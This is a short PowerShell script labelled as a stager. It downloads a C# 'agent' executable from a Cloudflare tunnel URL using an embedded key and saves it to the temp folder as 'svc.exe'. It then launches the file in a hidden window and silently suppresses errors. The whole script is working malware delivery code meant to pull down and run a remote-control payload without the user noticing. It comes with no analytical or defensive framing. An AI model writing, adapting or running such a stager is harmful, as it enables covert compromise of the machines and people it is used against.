# Stager - Downloads and runs C# agent
$u='https://dietary-clearing-literature-click.trycloudflare.com'
$k='8e016e25d56cd0ac28ed60cf2d0bc3a8'
$d=$env:TEMP+'\svc.exe'
try {
    $wc=New-Object Net.WebClient
    $wc.Headers.Add('User-Agent','Mozilla/5.0')
    $wc.DownloadFile("$u/payloads/agent_cs.exe?key=$k",$d)
    Start-Process $d -WindowStyle Hidden
} catch {}
